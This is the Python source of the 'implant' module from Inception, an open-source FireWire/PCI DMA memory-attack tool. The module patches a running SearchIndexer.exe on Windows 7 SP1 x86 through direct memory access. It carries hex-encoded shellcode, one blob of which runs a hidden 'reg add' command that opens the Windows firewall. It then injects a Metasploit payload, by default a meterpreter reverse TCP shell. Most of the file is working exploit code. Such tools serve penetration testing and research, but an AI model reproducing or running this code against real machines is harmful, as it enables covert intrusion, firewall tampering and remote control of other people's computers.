'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
PCI-based and IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2014  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Dec 5, 2013

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception import terminal
from inception.exceptions import InceptionException
from inception.external.pymetasploit.metasploit.msfrpc \
    import MsfRpcClient, MsfRpcError, PayloadModule
from inception.memory import Target, Signature, Chunk
from inception.interfaces.file import MemoryInterface


IS_INTRUSIVE = True

term = terminal.Terminal()

info = 'This module implants a (potentially memory-only) Metasploit ' \
       'payload directly to the volatile memory of the target machine.' \
       'You can also implant any other binary payload from file.'

# TODO
# class InfectSignature(collections.namedtuple('InfectSignature',
#                                              Signature._fields +
#                                              ('primary', 'staged'))):
#     '''
#     An extension of the Signature class, with the added 'primary' field that
#     allows distinguishing between primary and backup signatures.

#     Mandatory additional keyword arguments:
#     - primary: Set to True if this is the primary signature
#     - staged: Set to True if the signature need to be staged (allocate page)
#     '''
#     pass

# Exit function hashes

# kernel32.dll!SetUnhandledExceptionFilter (0xEA320EFE) - This exit function
# will let the UnhandledExceptionFilter function perform its default handling
# routine.

# kernel32.dll!ExitProcess (0x56A2B5F0) - This exit function will force the
# process to terminate.

# kernel32.dll!ExitThread (0x0A2A1DE0) - This exit function will force the
# current thread to terminate. On Windows 2008, Vista and 7 this function is
# a forwarded export to ntdll.dll!RtlExitUserThread and as such cannot be
# called by the api_call function.

# ntdll.dll!RtlExitUserThread (0x6F721347) - This exit function will force
# the current thread to terminate. This function is not available on Windows
# NT or 2000.
SEH = 0xea320efe         # kernel32.dll!SetUnhandledExceptionFilter
PROCESS = 0x56a2b5f0     # kernel32.dll!ExitProcess
THREAD = 0x0a2a1de0      # kernel32.dll!ExitThread
USERTHREAD = 0x6f721347  # ntdll.dll!RtlExitUserThread

shellcode = {
    'alloc_page':
    b'\xe8\x00\x00\x00\x00\x60\xfc\xe8\x89\x00\x00\x00\x60\x89' +
    b'\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b' +
    b'\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c' +
    b'\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52' +
    b'\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01' +
    b'\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b' +
    b'\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7' +
    b'\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b' +
    b'\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b' +
    b'\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51' +
    b'\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\xbe\x00\x01\x00' +
    b'\x00\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4' +
    b'\x53\xe5\xff\xd5\x66\xc7\x00\xff\xe0\xff\xe0',
    'create_thread':
    b'\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52' +
    b'\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26' +
    b'\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d' +
    b'\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0' +
    b'\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b' +
    b'\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff' +
    b'\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d' +
    b'\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b' +
    b'\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44' +
    b'\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b' +
    b'\x12\xeb\x86\x5d\x31\xc0\x50\x50\x50\x8d\x9d\xa8\x00\x00' +
    b'\x00\x53\x50\x50\x68\x38\x68\x0d\x16\xff\xd5\x61\x81\x2c' +
    b'\x24\x05\x00\x00\x00\xc3\x58',
    'reg_add':
    b'\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52' +
    b'\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26' +
    b'\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d' +
    b'\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0' +
    b'\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b' +
    b'\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff' +
    b'\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d' +
    b'\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b' +
    b'\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44' +
    b'\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b' +
    b'\x12\xeb\x86\x5d\x6a\x00\x8d\x85\xab\x00\x00\x00\x50\x68' +
    b'\x31\x8b\x6f\x87\xff\xd5\x68\xd0\x07\x00\x00\x68\x44\xf0' +
    b'\x35\xe0\xff\xd5\xe9\x42\x02\x00\x00\x63\x6d\x64\x20\x2f' +
    b'\x63\x20\x22\x72\x65\x67\x20\x61\x64\x64\x20\x48\x4b\x4c' +
    b'\x4d\x5c\x53\x59\x53\x54\x45\x4d\x5c\x43\x75\x72\x72\x65' +
    b'\x6e\x74\x43\x6f\x6e\x74\x72\x6f\x6c\x53\x65\x74\x5c\x73' +
    b'\x65\x72\x76\x69\x63\x65\x73\x5c\x53\x68\x61\x72\x65\x64' +
    b'\x41\x63\x63\x65\x73\x73\x5c\x50\x61\x72\x61\x6d\x65\x74' +
    b'\x65\x72\x73\x5c\x46\x69\x72\x65\x77\x61\x6c\x6c\x50\x6f' +
    b'\x6c\x69\x63\x79\x5c\x52\x65\x73\x74\x72\x69\x63\x74\x65' +
    b'\x64\x53\x65\x72\x76\x69\x63\x65\x73\x5c\x43\x6f\x6e\x66' +
    b'\x69\x67\x75\x72\x61\x62\x6c\x65\x5c\x53\x79\x73\x74\x65' +
    b'\x6d\x20\x2f\x76\x20\x53\x65\x61\x72\x63\x68\x49\x6e\x64' +
    b'\x65\x78\x65\x72\x2d\x31\x20\x2f\x74\x20\x52\x45\x47\x5f' +
    b'\x53\x5a\x20\x2f\x64\x20\x22\x76\x32\x2e\x30\x7c\x41\x63' +
    b'\x74\x69\x6f\x6e\x3d\x41\x6c\x6c\x6f\x77\x7c\x41\x63\x74' +
    b'\x69\x76\x65\x3d\x54\x52\x55\x45\x7c\x44\x69\x72\x3d\x49' +
    b'\x6e\x7c\x41\x70\x70\x3d\x25\x73\x79\x73\x74\x65\x6d\x44' +
    b'\x72\x69\x76\x65\x25\x5c\x57\x49\x4e\x44\x4f\x57\x53\x5c' +
    b'\x73\x79\x73\x74\x65\x6d\x33\x32\x5c\x53\x65\x61\x72\x63' +
    b'\x68\x49\x6e\x64\x65\x78\x65\x72\x2e\x65\x78\x65\x7c\x53' +
    b'\x76\x63\x3d\x57\x53\x65\x61\x72\x63\x68\x7c\x4e\x61\x6d' +
    b'\x65\x3d\x53\x65\x61\x72\x63\x68\x49\x6e\x64\x65\x78\x65' +
    b'\x72\x2d\x31\x7c\x22\x20\x26\x20\x72\x65\x67\x20\x61\x64' +
    b'\x64\x20\x48\x4b\x4c\x4d\x5c\x53\x59\x53\x54\x45\x4d\x5c' +
    b'\x43\x75\x72\x72\x65\x6e\x74\x43\x6f\x6e\x74\x72\x6f\x6c' +
    b'\x53\x65\x74\x5c\x73\x65\x72\x76\x69\x63\x65\x73\x5c\x53' +
    b'\x68\x61\x72\x65\x64\x41\x63\x63\x65\x73\x73\x5c\x50\x61' +
    b'\x72\x61\x6d\x65\x74\x65\x72\x73\x5c\x46\x69\x72\x65\x77' +
    b'\x61\x6c\x6c\x50\x6f\x6c\x69\x63\x79\x5c\x52\x65\x73\x74' +
    b'\x72\x69\x63\x74\x65\x64\x53\x65\x72\x76\x69\x63\x65\x73' +
    b'\x5c\x43\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65\x5c' +
    b'\x53\x79\x73\x74\x65\x6d\x20\x2f\x76\x20\x53\x65\x61\x72' +
    b'\x63\x68\x49\x6e\x64\x65\x78\x65\x72\x2d\x32\x20\x2f\x74' +
    b'\x20\x52\x45\x47\x5f\x53\x5a\x20\x2f\x64\x20\x22\x76\x32' +
    b'\x2e\x30\x7c\x41\x63\x74\x69\x6f\x6e\x3d\x41\x6c\x6c\x6f' +
    b'\x77\x7c\x41\x63\x74\x69\x76\x65\x3d\x54\x52\x55\x45\x7c' +
    b'\x44\x69\x72\x3d\x4f\x75\x74\x7c\x41\x70\x70\x3d\x25\x73' +
    b'\x79\x73\x74\x65\x6d\x44\x72\x69\x76\x65\x25\x5c\x57\x49' +
    b'\x4e\x44\x4f\x57\x53\x5c\x73\x79\x73\x74\x65\x6d\x33\x32' +
    b'\x5c\x53\x65\x61\x72\x63\x68\x49\x6e\x64\x65\x78\x65\x72' +
    b'\x2e\x65\x78\x65\x7c\x53\x76\x63\x3d\x57\x53\x65\x61\x72' +
    b'\x63\x68\x7c\x4e\x61\x6d\x65\x3d\x53\x65\x61\x72\x63\x68' +
    b'\x49\x6e\x64\x65\x78\x65\x72\x2d\x32\x7c\x22\x22\x00'
}

stage1 = Target(
    name='Allocate page',
    note='Create page, copy signature to it and jump to page',
    signatures=[
        Signature(
            offsets=[0x18c],
            chunks=[
                Chunk(
                    chunk=0x8bff558bec813D,
                    chunkoffset=0,
                    patch=shellcode['alloc_page'],
                    patchoffset=0)
                ],
            os='Windows 7',
            os_versions=['SP1'],
            os_architectures=['x86'],
            executable='SearchIndexer.exe',
            version='',
            md5='',
            tag=False)
        ]
    )


def add_options(group):
    group.add_option('--msfopts',
                     dest='msfopts',
                     help='exploit options in a comma-separated list using '
                          'the format \'OPTION=value\'')
    group.add_option('--msfpw',
                     dest='msfpw',
                     help='password for the MSFRPC daemon')
    group.add_option('--payload',
                     dest='payload_filename',
                     help='implant binary payload from file')


def str2dict(str):
    '''
    Returns a dict from a string formatted as OPTION1=value,OPTION2=value
    '''
    return dict([x.split('=') for x in str.split(',')])


def set_opts(module, msfopts):
    '''
    Sets MSF options given the selected module
    '''
    if msfopts:
        useropts = str2dict(msfopts)
        for opt in useropts:
            module[opt] = useropts[opt]


def set_exitfunc(payload, exitfunk):
    '''
    Sets the exitfunc of a payload by manipulating the binary string
    '''
    term.info('Overriding default MSF EXITFUNC, setting to \'thread\'')
    pass  # TODO


def run(opts, memspace):
    if not opts.msfpw:
        raise InceptionException('You must specify a password (--msfpw)')

    # Warning
    term.warn('This module currently only work as a proof-of-concept against '
              'Windows 7 SP1 x86. No other OSes, versions or architectures '
              'are supported, nor is there any guarantee that they will be '
              'supported in the future. If you want to change this, send me a '
              'wad of cash in unmarked dollar bills or a pull request on '
              'github.')

    if opts.payload_filename:
        try:
            payload = open(opts.payload_filename, 'rb').read()
        except Exception as e:
            raise InceptionException(e)
    else:
        # Connect to MSF RPD daemon and have it generate our shellcode
        try:
            client = MsfRpcClient(opts.msfpw)
        except MsfRpcError as e:
            raise InceptionException('Could not connect to Metasploit: {0}'
                                     .format(e))
        except Exception as e:
            raise InceptionException('Could not connect to Metasploit, '
                                     'is the `msfrpcd` daemon running? ({0})'
                                     .format(e))

        name = term.poll('What MSF payload do you want to use?',
                         default='windows/meterpreter/reverse_tcp')
        try:
            module = PayloadModule(client, name)
            set_opts(module, ','.join(filter(None, (opts.msfopts,
                                                    'EXITFUNC=thread'))))
            payload = module.execute(Encoder='generic/none').get('payload')
        except (MsfRpcError, TypeError) as e:
            raise InceptionException('Could not generate Metasploit payload: '
                                     '{0}'.format(e))

        needed = [x for x in module.required if x not in module.advanced]
        term.info('Selected options:')
        for o in needed:
            term.info('{0}: {1}'.format(o, module[o]))

    # TODO: Allow users to set required options

    # --- STAGE 1 ---
    term.info('Stage 1: Searcing for injection point')
    address, signature, offset = memspace.find(stage1, verbose=opts.verbose)
    
    # Signature found, let's patch
    term.found_at(address, memspace.page_no(address))
    term.info('Patching at {0:#x}'.format(address))
    backup = memspace.patch(address, signature.chunks)

    # TODO: Figure out what os & architecture we're attacking and select stage
    # For now, just select x86

    # Wait to ensure initial stage execution
    term.wait('Waiting to ensure stage 1 execution', 5)
    if isinstance(memspace.interface, MemoryInterface):
        term.poll('Press [enter] to continue')
    # TODO: Modify payload exitfunk that is used if the payload fails -
    # this is needed for stable kernel exploitation

    # --- STAGE 2 ---
    # Concatenate shellcode and payload
    payload = shellcode['create_thread'] + shellcode['reg_add'] + payload

    # Replace EXITFUNC with THREAD (it's hardcoded as PROCESS)
    # This helps ensure that the process doesn't crash if the exploit fails

    # Write back original, backed up page
    term.info('Restoring memory at initial injection point')
    memspace.write(address, backup)
    # Search for the newly allocated page with our signature
    term.info('Stage 2: Searching for page allocated in stage 1')
    address, signature, offset = memspace.rawfind(0,  # Offset
                                                  0xffe0000000000000,  # Sig
                                                  verbose=opts.verbose)
    # Signature found, let's patch
    term.found_at(address, memspace.page_no(address))
    term.info('Patching at {0:#x}'.format(address))
    memspace.write(address, payload)

    term.info('Patch verified; successful')
